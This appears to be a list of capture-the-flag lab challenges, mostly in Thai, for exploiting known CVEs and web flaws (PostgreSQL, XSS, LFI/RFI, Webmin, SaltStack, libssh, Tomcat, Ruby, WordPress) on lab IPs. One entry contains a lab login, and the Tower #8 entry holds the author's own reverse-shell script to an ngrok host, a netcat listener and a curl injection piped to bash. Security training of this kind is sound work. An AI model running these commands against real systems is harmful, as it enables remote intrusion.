# Tower
# ******************************************************************************
Tower #0 CVE-2019-9193 - Postgresql - RCE
Type: VM
Difficulty: Easy
Score: 10

Instruction

ให้ทำการอ่านไฟล์ /tmp/flag.txt จากการเข้าถึง Postgresql ด้วย user postgres ด้วย CVE-2019-9193
Information
Target IP Address
136.110.46.225
Allowed Ports
5432, 4444 

# ******************************************************************************
Tower #1  Cross Site Script (XSS)
Type: VM
Difficulty: Easy
Score: 10

Instruction

ให้กระทำการโจมตีแบบ Stored XSS ในหน้า support ของเว็บไซด์ที่ admin จะคอยมาสอดส่อง จากนั้นให้เข้าดูคำตอบที่หน้า admin
Information
Target IP Address
34.87.33.218
Allowed Ports
80 

# ******************************************************************************
Tower #2 Local File Inclusion x Remote File Inclusion#1
Type: VM
Difficulty: Easy
Score: 10

Instruction

ทำการอ่านไฟล์ /tmp/flag.txt โดยการโจมตีผ่าน Local File Inclusion (LFI) หรือ Remote File Inclusion (RFI)
Information
Target IP Address
136.110.1.31
Allowed Ports
80, 4444, 4445 

# ******************************************************************************
Tower #3 CVE-2019-15107 - Webmin - Remote Code Execution
Type: VM
Difficulty: Easy
Score: 10

Instruction

โจมตีด้วย CVE-2019-15107 ไปยังเครื่องโจทย์ จากนั้นอ่านไฟล์ /tmp/flag_random.txt
Information
Target IP Address
34.177.93.94
Allowed Ports
10000, 4444, 4445 

# ******************************************************************************
Tower #4 CVE-2020-11651 - SaltStack - Remote Code Execution
Type: VM
Difficulty: Easy
Score: 10

Instruction

ให้ทำการอ่านไฟล์ /tmp/flag_xxxxx.txt ด้วยการโจมตี CVE-2020-11651
Information
Target IP Address
34.87.46.136
Allowed Ports
4505, 4506, 8000, 4444, 4445 

# ******************************************************************************
Tower #5 CVE-2018-10933 - LibSSH - Authentication Bypass
Type: VM
Difficulty: Easy
Score: 10

Instruction

ใช้ script จาก เพื่อโจมตี แล้วเข้าไปอ่าน flag ภายใน /root/flag_xxxxxx.txt
Information
Target IP Address
34.87.63.36
Allowed Ports
22, 4444, 4445, 4446 


# ******************************************************************************
Tower #6 Script สำหรับการทำ Privilege Escalation
Type: VM
Difficulty: Easy
Score: 10

Instruction

Login เข้าสู่ระบบผ่าน port 4200 ด้วย

user= noob
password=N00bP@ssw0rd

จากนั้นทำการโจมตีโดยใช้ script ต่างๆ เพื่อเพิ่มสิทธิ์ของ user ให้กลายเป็นสิทธิ์สูงสุดแล้วเข้าไปอ่าน flag ที่ /root/flag_xxxxxx.txt
Information
Target IP Address
34.87.11.201
Allowed Ports
4200, 22 

# ******************************************************************************
Tower #7 Apache Tomcat CVE-2020-1938
Type: VM
Difficulty: Easy
Score: 10

Instruction

ให้ใช้ Nessus, OpenVAS ในการ scan เป้าหมาย จากนั้นโจมตีช่องโหว่ไปยังระบบดังกล่าว แล้วเข้าไปอ่าน flag ภายใน /root/flag.txt
Information
Target IP Address
34.87.102.147
Allowed Ports
8080, 80, 22, 8009 


# ******************************************************************************
Tower #8 CVE-2017-17405 - Command Injection - Ruby
Type: VM
Difficulty: Easy
Score: 10

Instruction

ให้โจมตีโดยใช้ช่องโหว่ CVE-2017-17405 จากนั้นเข้าไปอ่านไฟล์ flag ที่อยู่ใน /usr/src/
Information
Target IP Address
34.124.149.106
Allowed Ports
8080, 4444, 4445 


gobuster dir -u http://34.126.90.141:8080 -w /usr/share/wordlists/dirb/common.txt

┌──(kali㉿kali)-[~]
└─$ echo 'bash -i >& /dev/tcp/0.tcp.ap.ngrok.io/4444 0>&1 << EOF
whoami
EOF' > shell.sh

python3 -m http.server 8000


┌──(kali㉿kali)-[~]
└─$ nc -lvnp 4444 



┌──(kali㉿kali)-[~]
└─$ curl "http://34.126.90.141:8080/download?uri=ftp://0.tcp.ap.ngrok.io:13388/&file=shell.pHp" | bash




# ******************************************************************************
Tower #9 Wordpress with well-known vulnerability
Type: VM
Difficulty: Easy
Score: 10

Instruction

ให้อ่านค่า flag ที่อยู่ภายใน database โดยโจมตีไปยังช่องโหว่ของ Wordpress plugin
Information
Target IP Address
35.240.142.53
Allowed Ports
80 
